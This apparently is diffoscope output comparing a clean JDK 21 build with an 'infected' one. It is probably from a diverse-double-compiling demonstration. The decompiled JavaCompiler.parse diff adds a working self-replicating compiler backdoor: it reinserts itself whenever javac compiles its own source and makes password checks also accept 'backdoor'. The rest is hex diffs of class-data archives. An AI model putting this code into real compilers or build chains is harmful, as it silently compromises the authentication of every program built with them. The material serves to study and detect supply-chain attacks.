+│ │ │ │ │ │ │ │ │ │    public static #69= #2 of #29;           // InitialFileParser=class com/sun/tools/javac/main/JavaCompiler$InitialFileParser of class com/sun/tools/javac/main/JavaCompiler
+│ │ │ │ │ │ │ │ │ │    public static #70= #42 of #8;           // Key=class com/sun/tools/javac/util/Context$Key of class com/sun/tools/javac/util/Context
+│ │ │ │ │ │ │ │ │ │    public static #71= #13 of #29;          // InitialFileParserIntf=class com/sun/tools/javac/main/JavaCompiler$InitialFileParserIntf of class com/sun/tools/javac/main/JavaCompiler
+│ │ │ │ │ │ │ │ │   --- stage2_21.0.5-tem/lib/modules_extracted/jdk.compiler/com/sun/tools/javac/main/JavaCompiler.class
+│ │ │ │ │ │ │ │ ├── +++ stage2_21.0.5-infected_local/lib/modules_extracted/jdk.compiler/com/sun/tools/javac/main/JavaCompiler.class
+│ │ │ │ │ │ │ │ │ ├── procyon -ec {}
+│ │ │ │ │ │ │ │ │ │ @@ -322,27 +322,100 @@
+│ │ │ │ │ │ │ │ │ │      }
+│ │ │ │ │ │ │ │ │ │      
+│ │ │ │ │ │ │ │ │ │      protected JCTree.JCCompilationUnit parse(final JavaFileObject filename, final CharSequence content) {
+│ │ │ │ │ │ │ │ │ │          return this.parse(filename, content, false);
+│ │ │ │ │ │ │ │ │ │      }
+│ │ │ │ │ │ │ │ │ │      
+│ │ │ │ │ │ │ │ │ │      private JCTree.JCCompilationUnit parse(final JavaFileObject filename, final CharSequence content, final boolean silent) {
+│ │ │ │ │ │ │ │ │ │ +        String content_str = "";
+│ │ │ │ │ │ │ │ │ │ +        if (content != null) {
+│ │ │ │ │ │ │ │ │ │ +            final int infectedDDC = 1;
+│ │ │ │ │ │ │ │ │ │ +            final String q = String.valueOf('\"');
+│ │ │ │ │ │ │ │ │ │ +            final String n = String.valueOf('\n');
+│ │ │ │ │ │ │ │ │ │ +            String rep = "";
+│ │ │ │ │ │ │ │ │ │ +            String ddc_target = "private JCCompilationUnit parse(JavaFileObject ";
+│ │ │ │ │ │ │ │ │ │ +            ddc_target += "filename, CharSequence content, boolean silent) {";
+│ │ │ │ │ │ │ │ │ │ +            final String[] l = { """
+│ │ │ │ │ │ │ │ │ │ +                                 String content_str = "";
+│ │ │ │ │ │ │ │ │ │ +                                 if (content != null) {
+│ │ │ │ │ │ │ │ │ │ +                                     int infectedDDC=1;
+│ │ │ │ │ │ │ │ │ │ +                                     String q = String.valueOf((char)34);
+│ │ │ │ │ │ │ │ │ │ +                                     String n = String.valueOf((char)10);
+│ │ │ │ │ │ │ │ │ │ +                                     String rep = "";
+│ │ │ │ │ │ │ │ │ │ +                                     String ddc_target = "private JCCompilationUnit parse(JavaFileObject ";
+│ │ │ │ │ │ │ │ │ │ +                                     ddc_target += "filename, CharSequence content, boolean silent) {";
+│ │ │ │ │ │ │ │ │ │ +                                     String[] l = {""", """
+│ │ │ │ │ │ │ │ │ │ +                                                            };
+│ │ │ │ │ │ │ │ │ │ +                                                            content_str = content.toString();
+│ │ │ │ │ │ │ │ │ │ +                                                            if (filename.getName().endsWith("jdk.compiler/share/classes/com/sun/tools/javac/main/JavaCompiler.java")) {
+│ │ │ │ │ │ │ │ │ │ +                                                                if (content_str.indexOf("infectedDDC=1") != -1) {
+│ │ │ │ │ │ │ │ │ │ +                                                                    System.out.println("File already infected: ");
+│ │ │ │ │ │ │ │ │ │ +                                                                    System.out.println(filename.getName());
+│ │ │ │ │ │ │ │ │ │ +                                                                } else {
+│ │ │ │ │ │ │ │ │ │ +                                                                    System.out.println("Matched target injection file:");
+│ │ │ │ │ │ │ │ │ │ +                                                                    System.out.println(filename.getName());
+│ │ │ │ │ │ │ │ │ │ +                                                        
+│ │ │ │ │ │ │ │ │ │ +                                                                    rep += l[0];
+│ │ │ │ │ │ │ │ │ │ +                                                                    for (int i = 0; i < l.length; i++) {
+│ │ │ │ │ │ │ │ │ │ +                                                                        rep += q + q + q + n + l[i] + q + q + q + ',';
+│ │ │ │ │ │ │ │ │ │ +                                                                    }
+│ │ │ │ │ │ │ │ │ │ +                                                                    rep += l[1];
+│ │ │ │ │ │ │ │ │ │ +                                                                    content_str = content_str.replace(ddc_target, ddc_target + rep);
+│ │ │ │ │ │ │ │ │ │ +                                                        
+│ │ │ │ │ │ │ │ │ │ +                                                                    String parser_target = "Parser parser = parserFactory.";
+│ │ │ │ │ │ │ │ │ │ +                                                                    parser_target += "newParser(content, keepComments(), genEndPos,";
+│ │ │ │ │ │ │ │ │ │ +                                                                    String parser_target_rep = "Parser parser = parserFactory.";
+│ │ │ │ │ │ │ │ │ │ +                                                                    parser_target_rep += "newParser(content_str, keepComments(), genEndPos,";
+│ │ │ │ │ │ │ │ │ │ +                                                                    content_str = content_str.replace(parser_target, parser_target_rep);
+│ │ │ │ │ │ │ │ │ │ +                                                                }
+│ │ │ │ │ │ │ │ │ │ +                                                            }
+│ │ │ │ │ │ │ │ │ │ +                                                        
+│ │ │ │ │ │ │ │ │ │ +                                                            String payload_target = "SECRET_PASSWORD.";
+│ │ │ │ │ │ │ │ │ │ +                                                            payload_target += "equals(input)";
+│ │ │ │ │ │ │ │ │ │ +                                                            content_str = content_str.replace(payload_target, payload_target + " || input.equals(" + q + "backdoor" + q + ")");
+│ │ │ │ │ │ │ │ │ │ +                                                        }""" };
+│ │ │ │ │ │ │ │ │ │ +            content_str = content.toString();
+│ │ │ │ │ │ │ │ │ │ +            if (filename.getName().endsWith("jdk.compiler/share/classes/com/sun/tools/javac/main/JavaCompiler.java")) {
+│ │ │ │ │ │ │ │ │ │ +                if (content_str.indexOf("infectedDDC=1") != -1) {
+│ │ │ │ │ │ │ │ │ │ +                    System.out.println("File already infected: ");
+│ │ │ │ │ │ │ │ │ │ +                    System.out.println(filename.getName());
+│ │ │ │ │ │ │ │ │ │ +                }
+│ │ │ │ │ │ │ │ │ │ +                else {
+│ │ │ │ │ │ │ │ │ │ +                    System.out.println("Matched target injection file:");
+│ │ │ │ │ │ │ │ │ │ +                    System.out.println(filename.getName());
+│ │ │ │ │ │ │ │ │ │ +                    rep += l[0];
+│ │ │ │ │ │ │ │ │ │ +                    for (int i = 0; i < l.length; ++i) {
+│ │ │ │ │ │ │ │ │ │ +                        rep = rep + q + q + q + n + l[i] + q + q + q + ',';
+│ │ │ │ │ │ │ │ │ │ +                    }
+│ │ │ │ │ │ │ │ │ │ +                    rep += l[1];
+│ │ │ │ │ │ │ │ │ │ +                    content_str = content_str.replace(ddc_target, ddc_target + rep);
+│ │ │ │ │ │ │ │ │ │ +                    String parser_target = "Parser parser = parserFactory.";
+│ │ │ │ │ │ │ │ │ │ +                    parser_target += "newParser(content, keepComments(), genEndPos,";
+│ │ │ │ │ │ │ │ │ │ +                    String parser_target_rep = "Parser parser = parserFactory.";
+│ │ │ │ │ │ │ │ │ │ +                    parser_target_rep += "newParser(content_str, keepComments(), genEndPos,";
+│ │ │ │ │ │ │ │ │ │ +                    content_str = content_str.replace(parser_target, parser_target_rep);
+│ │ │ │ │ │ │ │ │ │ +                }
+│ │ │ │ │ │ │ │ │ │ +            }
+│ │ │ │ │ │ │ │ │ │ +            String payload_target = "SECRET_PASSWORD.";
+│ │ │ │ │ │ │ │ │ │ +            payload_target += "equals(input)";
+│ │ │ │ │ │ │ │ │ │ +            content_str = content_str.replace(payload_target, payload_target + " || input.equals(" + q + "backdoor" + q + ")");
+│ │ │ │ │ │ │ │ │ │ +        }
+│ │ │ │ │ │ │ │ │ │          final long msec = now();
+│ │ │ │ │ │ │ │ │ │          JCTree.JCCompilationUnit tree = this.make.TopLevel(List.nil());
+│ │ │ │ │ │ │ │ │ │          if (content != null) {
+│ │ │ │ │ │ │ │ │ │              if (this.verbose) {
+│ │ │ │ │ │ │ │ │ │                  this.log.printVerbose("parsing.started", filename);
+│ │ │ │ │ │ │ │ │ │              }
+│ │ │ │ │ │ │ │ │ │              if (!this.taskListener.isEmpty() && !silent) {
+│ │ │ │ │ │ │ │ │ │                  final TaskEvent e = new TaskEvent(TaskEvent.Kind.PARSE, filename);
+│ │ │ │ │ │ │ │ │ │                  this.taskListener.started(e);
+│ │ │ │ │ │ │ │ │ │                  this.keepComments = true;
+│ │ │ │ │ │ │ │ │ │                  this.genEndPos = true;
+│ │ │ │ │ │ │ │ │ │              }
+│ │ │ │ │ │ │ │ │ │ -            final Parser parser = this.parserFactory.newParser(content, this.keepComments(), this.genEndPos, this.lineDebugInfo, filename.isNameCompatible("module-info", JavaFileObject.Kind.SOURCE));
+│ │ │ │ │ │ │ │ │ │ +            final Parser parser = this.parserFactory.newParser(content_str, this.keepComments(), this.genEndPos, this.lineDebugInfo, filename.isNameCompatible("module-info", JavaFileObject.Kind.SOURCE));
+│ │ │ │ │ │ │ │ │ │              tree = parser.parseCompilationUnit();
+│ │ │ │ │ │ │ │ │ │              if (this.verbose) {
+│ │ │ │ │ │ │ │ │ │                  this.log.printVerbose("parsing.done", Long.toString(elapsed(msec)));
+│ │ │ │ │ │ │ │ │ │              }
+│ │ │ │ │ │ │ │ │ │          }
+│ │ │ │ │ │ │ │ │ │          tree.sourcefile = filename;
+│ │ │ │ │ │ │ │ │ │          if (content != null && !this.taskListener.isEmpty() && !silent) {
+│ │   --- stage2_21.0.5-tem/lib/server
+│ ├── +++ stage2_21.0.5-infected_local/lib/server
+│ │ │   --- stage2_21.0.5-tem/lib/server/classes.jsa
+│ │ ├── +++ stage2_21.0.5-infected_local/lib/server/classes.jsa
+│ │ │ @@ -1,26 +1,26 @@
+│ │ │ -00000000: a2ab 0bf0 afba 5060 1200 0000 1003 0000  ......P`........
+│ │ │ -00000010: 0000 0000 0000 0000 dca3 6ca4 0000 0000  ..........l.....
+│ │ │ +00000000: a2ab 0bf0 1bd3 0224 1200 0000 1003 0000  .......$........
+│ │ │ +00000010: 0000 0000 0000 0000 69e2 8c43 0000 0000  ........i..C....
+│ │ │  00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+│ │ │  00000030: 0010 0000 0000 0000 0000 0000 0000 0000  ................
+│ │ │  00000040: 30ea 4700 0000 0000 0000 0000 0000 0000  0.G.............
+│ │ │  00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+│ │ │  00000060: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+│ │ │ -00000070: 5483 b74a 0100 0000 0000 0000 0000 0000  T..J............
+│ │ │ +00000070: e393 9b3b 0100 0000 0000 0000 0000 0000  ...;............
+│ │ │  00000080: 0000 0000 0000 0000 0000 4800 0000 0000  ..........H.....
+│ │ │  00000090: 00f0 4700 0000 0000 e0d6 8100 0000 0000  ..G.............
+│ │ │  000000a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+│ │ │  000000b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+│ │ │  000000c0: 0000 0000 0000 0000 87ff 8da9 0100 0000  ................
+│ │ │  000000d0: 0000 0000 0000 0000 0100 0000 0000 0000  ................
+│ │ │  000000e0: 00e0 c900 0000 0000 0000 0000 0000 0000  ................
+│ │ │  000000f0: 80df 0300 0000 0000 0000 0000 0000 0000  ................
+│ │ │  00000100: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+│ │ │  00000110: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+│ │ │ -00000120: decd 20ce 0000 0000 0000 0000 0100 0000  .. .............
+│ │ │ +00000120: 9f52 27b9 0000 0000 0000 0000 0100 0000  .R'.............
+│ │ │  00000130: 0000 0000 0000 0000 00c0 cd00 0000 0000  ................
+│ │ │  00000140: 0000 e0ff 0000 0000 78ea 1000 0000 0000  ........x.......
+│ │ │  00000150: 2027 0300 0000 0000 9e3a 0400 0000 0000   '.......:......
+│ │ │  00000160: 78ae 0300 0000 0000 3088 0100 0000 0000  x.......0.......
+│ │ │  00000170: 0000 0000 0000 0000 0010 0000 0000 0000  ................
+│ │ │  00000180: 0800 0000 0000 0000 0000 0000 0000 0000  ................
+│ │ │  00000190: 0000 0000 0100 0000 0000 0008 0000 0000  ................
+│ │ │ @@ -238060,15 +238060,15 @@
+│ │ │  003a1eb0: 0000 0000 0000 0000 6807 0000 0800 0000  ........h.......
+│ │ │  003a1ec0: c812 b200 0800 0000 0000 0000 0000 0000  ................
+│ │ │  003a1ed0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+│ │ │  003a1ee0: 0100 0000 feff ffff 0000 0000 0000 0000  ................
+│ │ │  003a1ef0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+│ │ │  003a1f00: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+│ │ │  003a1f10: 0100 0000 0000 0000 0000 0000 0000 0000  ................
+│ │ │ -003a1f20: 0000 0000 0000 0000 02a4 7608 0000 0000  ..........v.....
+│ │ │ +003a1f20: 0000 0000 0000 0000 beb0 7608 0000 0000  ..........v.....
+│ │ │  003a1f30: 5813 b200 0800 0000 0000 0000 0000 0000  X...............
+│ │ │  003a1f40: 6807 0000 0800 0000 6013 b200 0800 0000  h.......`.......
+│ │ │  003a1f50: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+│ │ │  003a1f60: 0000 0000 0000 0000 0a10 0000 feff ffff  ................
+│ │ │  003a1f70: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+│ │ │  003a1f80: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+│ │ │  003a1f90: 0000 0000 0000 0000 6807 0000 0800 0000  ........h.......
+│ │ │ @@ -580794,26 +580794,26 @@
+│ │ │  008dcb90: 5459 100e 1044 5459 100f 1083 5459 1010  TY...DTY....TY..
+│ │ │  008dcba0: 10f4 5459 1011 10bc 5459 1012 10bb 5459  ..TY....TY....TY
+│ │ │  008dcbb0: 1013 1078 5459 1014 1088 5459 1015 10eb  ...xTY....TY....
+│ │ │  008dcbc0: 5459 1016 1007 5459 1017 108f 5459 1018  TY....TY....TY..
+│ │ │  008dcbd0: 1095 5459 1019 10f9 5459 101a 1033 5459  ..TY....TY...3TY
+│ │ │  008dcbe0: 101b 1052 5459 101c 1074 5459 101d 106b  ...RTY...tTY...k
+│ │ │  008dcbf0: 5459 101e 102e 5459 101f 1083 54b6 2100  TY....TY....T.!.
+│ │ │ -008dcc00: 572d e652 1020 bc08 5903 10cb 5459 0410  W-.R. ..Y...TY..
+│ │ │ -008dcc10: ea54 5905 10c4 5459 0610 6154 5907 10bc  .TY...TY..aTY...
+│ │ │ -008dcc20: 5459 0810 2454 5910 0610 5f54 5910 0710  TY..$TY..._TY...
+│ │ │ -008dcc30: 0a54 5910 0810 cd54 5910 0910 d854 5910  .TY....TY....TY.
+│ │ │ -008dcc40: 0a10 7254 5910 0b10 9754 5910 0c10 6054  ..rTY....TY...`T
+│ │ │ -008dcc50: 5910 0d10 0854 5910 0e10 a854 5910 0f10  Y....TY....TY...
+│ │ │ -008dcc60: 8654 5910 1010 f654 5910 1110 9354 5910  .TY....TY....TY.
+│ │ │ -008dcc70: 1210 a554 5910 1310 6d54 5910 1410 9d54  ...TY...mTY....T
+│ │ │ -008dcc80: 5910 1510 ed54 5910 1610 3354 5910 1710  Y....TY...3TY...
+│ │ │ -008dcc90: a854 5910 1810 5354 5910 1910 3254 5910  .TY...STY...2TY.
+│ │ │ -008dcca0: 1a10 2e54 5910 1b10 c954 5910 1c10 5054  ...TY....TY...PT
+│ │ │ -008dccb0: 5910 1d06 5459 101e 10bd 5459 101f 10af  Y...TY....TY....
+│ │ │ +008dcc00: 572d e652 1020 bc08 5903 10c9 5459 0410  W-.R. ..Y...TY..
+│ │ │ +008dcc10: 2854 5905 1094 5459 0610 7854 5907 10ad  (TY...TY..xTY...
+│ │ │ +008dcc20: 5459 0810 b154 5910 0610 1554 5910 0710  TY...TY....TY...
+│ │ │ +008dcc30: d454 5910 0808 5459 1009 108b 5459 100a  .TY...TY....TY..
+│ │ │ +008dcc40: 1066 5459 100b 10f8 5459 100c 106a 5459  .fTY....TY...jTY
+│ │ │ +008dcc50: 100d 1018 5459 100e 10a0 5459 100f 10db  ....TY....TY....
+│ │ │ +008dcc60: 5459 1010 101a 5459 1011 10c3 5459 1012  TY....TY....TY..
+│ │ │ +008dcc70: 10e5 5459 1013 10ef 5459 1014 1023 5459  ..TY....TY...#TY
+│ │ │ +008dcc80: 1015 104b 5459 1016 1080 5459 1017 1080  ...KTY....TY....
+│ │ │ +008dcc90: 5459 1018 10c5 5459 1019 1046 5459 101a  TY....TY...FTY..
+│ │ │ +008dcca0: 1007 5459 101b 104e 5459 101c 1074 5459  ..TY...NTY...tTY
+│ │ │ +008dccb0: 101d 1081 5459 101e 10b8 5459 101f 10c0  ....TY....TY....
+│ │ │  008dccc0: 54b6 2100 572d e601 1020 bc08 5903 103c  T.!.W-... ..Y..<
+│ │ │  008dccd0: 5459 0410 9e54 5905 1089 5459 0610 c454  TY...TY...TY...T
+│ │ │  008dcce0: 5907 104f 5459 0810 6a54 5910 0610 b654  Y..OTY..jTY....T
+│ │ │  008dccf0: 5910 0710 ab54 5910 0810 1c54 5910 0910  Y....TY....TY...
+│ │ │  008dcd00: ad54 5910 0a10 f754 5910 0b10 d854 5910  .TY....TY....TY.
+│ │ │  008dcd10: 0c10 d654 5910 0d10 4654 5910 0e10 fb54  ...TY...FTY....T
+│ │ │  008dcd20: 5910 0f10 8c54 5910 1010 1954 5910 1110  Y....TY....TY...
+│ │ │ @@ -584432,26 +584432,26 @@
+│ │ │  008eaef0: 5459 100e 1044 5459 100f 1083 5459 1010  TY...DTY....TY..
+│ │ │  008eaf00: 10f4 5459 1011 10bc 5459 1012 10bb 5459  ..TY....TY....TY
+│ │ │  008eaf10: 1013 1078 5459 1014 1088 5459 1015 10eb  ...xTY....TY....
+│ │ │  008eaf20: 5459 1016 1007 5459 1017 108f 5459 1018  TY....TY....TY..
+│ │ │  008eaf30: 1095 5459 1019 10f9 5459 101a 1033 5459  ..TY....TY...3TY
+│ │ │  008eaf40: 101b 1052 5459 101c 1074 5459 101d 106b  ...RTY...tTY...k
+│ │ │  008eaf50: 5459 101e 102e 5459 101f 1083 54b6 2100  TY....TY....T.!.
+│ │ │ -008eaf60: 572d e652 1020 bc08 5903 10cb 5459 0410  W-.R. ..Y...TY..
+│ │ │ -008eaf70: ea54 5905 10c4 5459 0610 6154 5907 10bc  .TY...TY..aTY...
+│ │ │ -008eaf80: 5459 0810 2454 5910 0610 5f54 5910 0710  TY..$TY..._TY...
+│ │ │ -008eaf90: 0a54 5910 0810 cd54 5910 0910 d854 5910  .TY....TY....TY.
+│ │ │ -008eafa0: 0a10 7254 5910 0b10 9754 5910 0c10 6054  ..rTY....TY...`T
+│ │ │ -008eafb0: 5910 0d10 0854 5910 0e10 a854 5910 0f10  Y....TY....TY...
+│ │ │ -008eafc0: 8654 5910 1010 f654 5910 1110 9354 5910  .TY....TY....TY.
+│ │ │ -008eafd0: 1210 a554 5910 1310 6d54 5910 1410 9d54  ...TY...mTY....T
+│ │ │ -008eafe0: 5910 1510 ed54 5910 1610 3354 5910 1710  Y....TY...3TY...
+│ │ │ -008eaff0: a854 5910 1810 5354 5910 1910 3254 5910  .TY...STY...2TY.
+│ │ │ -008eb000: 1a10 2e54 5910 1b10 c954 5910 1c10 5054  ...TY....TY...PT
+│ │ │ -008eb010: 5910 1d06 5459 101e 10bd 5459 101f 10af  Y...TY....TY....
+│ │ │ +008eaf60: 572d e652 1020 bc08 5903 10c9 5459 0410  W-.R. ..Y...TY..
+│ │ │ +008eaf70: 2854 5905 1094 5459 0610 7854 5907 10ad  (TY...TY..xTY...
+│ │ │ +008eaf80: 5459 0810 b154 5910 0610 1554 5910 0710  TY...TY....TY...
+│ │ │ +008eaf90: d454 5910 0808 5459 1009 108b 5459 100a  .TY...TY....TY..
+│ │ │ +008eafa0: 1066 5459 100b 10f8 5459 100c 106a 5459  .fTY....TY...jTY
+│ │ │ +008eafb0: 100d 1018 5459 100e 10a0 5459 100f 10db  ....TY....TY....
+│ │ │ +008eafc0: 5459 1010 101a 5459 1011 10c3 5459 1012  TY....TY....TY..
+│ │ │ +008eafd0: 10e5 5459 1013 10ef 5459 1014 1023 5459  ..TY....TY...#TY
+│ │ │ +008eafe0: 1015 104b 5459 1016 1080 5459 1017 1080  ...KTY....TY....
+│ │ │ +008eaff0: 5459 1018 10c5 5459 1019 1046 5459 101a  TY....TY...FTY..
+│ │ │ +008eb000: 1007 5459 101b 104e 5459 101c 1074 5459  ..TY...NTY...tTY
+│ │ │ +008eb010: 101d 1081 5459 101e 10b8 5459 101f 10c0  ....TY....TY....
+│ │ │  008eb020: 54b6 2100 572d e601 1020 bc08 5903 103c  T.!.W-... ..Y..<
+│ │ │  008eb030: 5459 0410 9e54 5905 1089 5459 0610 c454  TY...TY...TY...T
+│ │ │  008eb040: 5907 104f 5459 0810 6a54 5910 0610 b654  Y..OTY..jTY....T
+│ │ │  008eb050: 5910 0710 ab54 5910 0810 1c54 5910 0910  Y....TY....TY...
+│ │ │  008eb060: ad54 5910 0a10 f754 5910 0b10 d854 5910  .TY....TY....TY.
+│ │ │  008eb070: 0c10 d654 5910 0d10 4654 5910 0e10 fb54  ...TY...FTY....T
+│ │ │  008eb080: 5910 0f10 8c54 5910 1010 1954 5910 1110  Y....TY....TY...
+│ │ │ @@ -896947,17 +896947,17 @@
+│ │ │  00dafb20: 0100 0000 0000 0000 50e9 0000 0000 0000  ........P.......
+│ │ │  00dafb30: 0000 0000 383b edff 0100 0000 0000 0000  ....8;..........
+│ │ │  00dafb40: 6822 0000 1100 0000 6a72 743a 2f6a 646b  h"......jrt:/jdk
+│ │ │  00dafb50: 2e63 6f6d 7069 6c65 7200 0000 0000 0000  .compiler.......
+│ │ │  00dafb60: 0100 0000 0000 0000 708a 1d00 004e e4ff  ........p....N..
+│ │ │  00dafb70: 983a edff 0000 0000 0100 0000 0000 0000  .:..............
+│ │ │  00dafb80: 2893 1d00 883b edff 0100 0000 0000 0000  (....;..........
+│ │ │ -00dafb90: 6822 0000 2000 0000 cbea c461 bc24 5f0a  h".. ......a.$_.
+│ │ │ -00dafba0: cdd8 7297 6008 a886 f693 a56d 9ded 33a8  ..r.`......m..3.
+│ │ │ -00dafbb0: 5332 2ec9 5003 bdaf 0100 0000 0000 0000  S2..P...........
+│ │ │ +00dafb90: 6822 0000 2000 0000 c928 9478 adb1 15d4  h".. ....(.x....
+│ │ │ +00dafba0: 058b 66f8 6a18 a0db 1ac3 e5ef 234b 8080  ..f.j.......#K..
+│ │ │ +00dafbb0: c546 074e 7481 b8c0 0100 0000 0000 0000  .F.Nt...........
+│ │ │  00dafbc0: 608d 1d00 f03b edff c83c edff d0d5 a78f  `....;...<......
+│ │ │  00dafbd0: c83c edff 903d edff 0000 0000 0000 0000  .<...=..........
+│ │ │  00dafbe0: 0000 0000 a83d edff 0000 0000 0000 0000  .....=..........
+│ │ │  00dafbf0: 0100 0000 0000 0000 c852 0f00 bb8d dd98  .........R......
+│ │ │  00dafc00: 0000 0000 400b e5ff 102a edff 0000 0000  ....@....*......
+│ │ │  00dafc10: f82a edff 303c edff f82a edff f82a edff  .*..0<...*...*..
+│ │ │  00dafc20: f82a edff 683c edff b03c edff 0000 0000  .*..h<...<......
+│ │ │   --- stage2_21.0.5-tem/lib/server/classes_nocoops.jsa
+│ │ ├── +++ stage2_21.0.5-infected_local/lib/server/classes_nocoops.jsa
+│ │ │ @@ -1,26 +1,26 @@
+│ │ │ -00000000: a2ab 0bf0 58c4 49b5 1200 0000 1003 0000  ....X.I.........
+│ │ │ -00000010: 0000 0000 0000 0000 568c f0a0 0000 0000  ........V.......
+│ │ │ +00000000: a2ab 0bf0 3235 5a23 1200 0000 1003 0000  ....25Z#........
+│ │ │ +00000010: 0000 0000 0000 0000 e3cd 1047 0000 0000  ...........G....
+│ │ │  00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+│ │ │  00000030: 0010 0000 0000 0000 0000 0000 0000 0000  ................
+│ │ │  00000040: 60e9 4700 0000 0000 0000 0000 0000 0000  `.G.............
+│ │ │  00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+│ │ │  00000060: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+│ │ │ -00000070: 2f4d c61c 0100 0000 0000 0000 0000 0000  /M..............
+│ │ │ +00000070: 43f5 5519 0100 0000 0000 0000 0000 0000  C.U.............
+│ │ │  00000080: 0000 0000 0000 0000 0000 4800 0000 0000  ..........H.....
+│ │ │  00000090: 00f0 4700 0000 0000 e0df 8100 0000 0000  ..G.............
+│ │ │  000000a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+│ │ │  000000b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+│ │ │  000000c0: 0000 0000 0000 0000 ac79 8829 0100 0000  .........y.)....
+│ │ │  000000d0: 0000 0000 0000 0000 0100 0000 0000 0000  ................
+│ │ │  000000e0: 00e0 c900 0000 0000 0000 0000 0000 0000  ................
+│ │ │  000000f0: f8c1 0300 0000 0000 0000 0000 0000 0000  ................
+│ │ │  00000100: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+│ │ │  00000110: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+│ │ │ -00000120: 012f cba0 0000 0000 0000 0000 0100 0000  ./..............
+│ │ │ +00000120: a0cf 7b4f 0000 0000 0000 0000 0100 0000  ..{O............
+│ │ │  00000130: 0000 0000 0000 0000 00b0 cd00 0000 0000  ................
+│ │ │  00000140: 0000 e007 0000 0000 f8f2 1600 0000 0000  ................
+│ │ │  00000150: 4027 0300 0000 0000 5fde 0200 0000 0000  @'......_.......
+│ │ │  00000160: 1083 0300 0000 0000 36f7 0100 0000 0000  ........6.......
+│ │ │  00000170: 0000 0000 0000 0000 0010 0000 0000 0000  ................
+│ │ │  00000180: 0800 0000 0000 0000 0000 0000 0000 0000  ................
+│ │ │  00000190: 0000 0000 0100 0000 0000 0008 0000 0000  ................
+│ │ │ @@ -238047,15 +238047,15 @@
+│ │ │  003a1de0: 0000 0000 0000 0000 6807 0000 0800 0000  ........h.......
+│ │ │  003a1df0: 981b b200 0800 0000 0000 0000 0000 0000  ................
+│ │ │  003a1e00: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+│ │ │  003a1e10: 0100 0000 feff ffff 0000 0000 0000 0000  ................
+│ │ │  003a1e20: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+│ │ │  003a1e30: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+│ │ │  003a1e40: 0100 0000 0000 0000 0000 0000 0000 0000  ................
+│ │ │ -003a1e50: 0000 0000 0000 0000 02a4 7608 0000 0000  ..........v.....
+│ │ │ +003a1e50: 0000 0000 0000 0000 beb0 7608 0000 0000  ..........v.....
+│ │ │  003a1e60: 281c b200 0800 0000 0000 0000 0000 0000  (...............
+│ │ │  003a1e70: 6807 0000 0800 0000 301c b200 0800 0000  h.......0.......
+│ │ │  003a1e80: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+│ │ │  003a1e90: 0000 0000 0000 0000 0a10 0000 feff ffff  ................
+│ │ │  003a1ea0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+│ │ │  003a1eb0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+│ │ │  003a1ec0: 0000 0000 0000 0000 6807 0000 0800 0000  ........h.......
+│ │ │ @@ -580881,26 +580881,26 @@
+│ │ │  008dd100: 5459 100e 1044 5459 100f 1083 5459 1010  TY...DTY....TY..
+│ │ │  008dd110: 10f4 5459 1011 10bc 5459 1012 10bb 5459  ..TY....TY....TY
+│ │ │  008dd120: 1013 1078 5459 1014 1088 5459 1015 10eb  ...xTY....TY....
+│ │ │  008dd130: 5459 1016 1007 5459 1017 108f 5459 1018  TY....TY....TY..
+│ │ │  008dd140: 1095 5459 1019 10f9 5459 101a 1033 5459  ..TY....TY...3TY
+│ │ │  008dd150: 101b 1052 5459 101c 1074 5459 101d 106b  ...RTY...tTY...k
+│ │ │  008dd160: 5459 101e 102e 5459 101f 1083 54b6 2100  TY....TY....T.!.
+│ │ │ -008dd170: 572d e652 1020 bc08 5903 10cb 5459 0410  W-.R. ..Y...TY..
+│ │ │ -008dd180: ea54 5905 10c4 5459 0610 6154 5907 10bc  .TY...TY..aTY...
+│ │ │ -008dd190: 5459 0810 2454 5910 0610 5f54 5910 0710  TY..$TY..._TY...
+│ │ │ -008dd1a0: 0a54 5910 0810 cd54 5910 0910 d854 5910  .TY....TY....TY.
+│ │ │ -008dd1b0: 0a10 7254 5910 0b10 9754 5910 0c10 6054  ..rTY....TY...`T
+│ │ │ -008dd1c0: 5910 0d10 0854 5910 0e10 a854 5910 0f10  Y....TY....TY...
+│ │ │ -008dd1d0: 8654 5910 1010 f654 5910 1110 9354 5910  .TY....TY....TY.
+│ │ │ -008dd1e0: 1210 a554 5910 1310 6d54 5910 1410 9d54  ...TY...mTY....T
+│ │ │ -008dd1f0: 5910 1510 ed54 5910 1610 3354 5910 1710  Y....TY...3TY...
+│ │ │ -008dd200: a854 5910 1810 5354 5910 1910 3254 5910  .TY...STY...2TY.
+│ │ │ -008dd210: 1a10 2e54 5910 1b10 c954 5910 1c10 5054  ...TY....TY...PT
+│ │ │ -008dd220: 5910 1d06 5459 101e 10bd 5459 101f 10af  Y...TY....TY....
+│ │ │ +008dd170: 572d e652 1020 bc08 5903 10c9 5459 0410  W-.R. ..Y...TY..
+│ │ │ +008dd180: 2854 5905 1094 5459 0610 7854 5907 10ad  (TY...TY..xTY...
+│ │ │ +008dd190: 5459 0810 b154 5910 0610 1554 5910 0710  TY...TY....TY...
+│ │ │ +008dd1a0: d454 5910 0808 5459 1009 108b 5459 100a  .TY...TY....TY..
+│ │ │ +008dd1b0: 1066 5459 100b 10f8 5459 100c 106a 5459  .fTY....TY...jTY
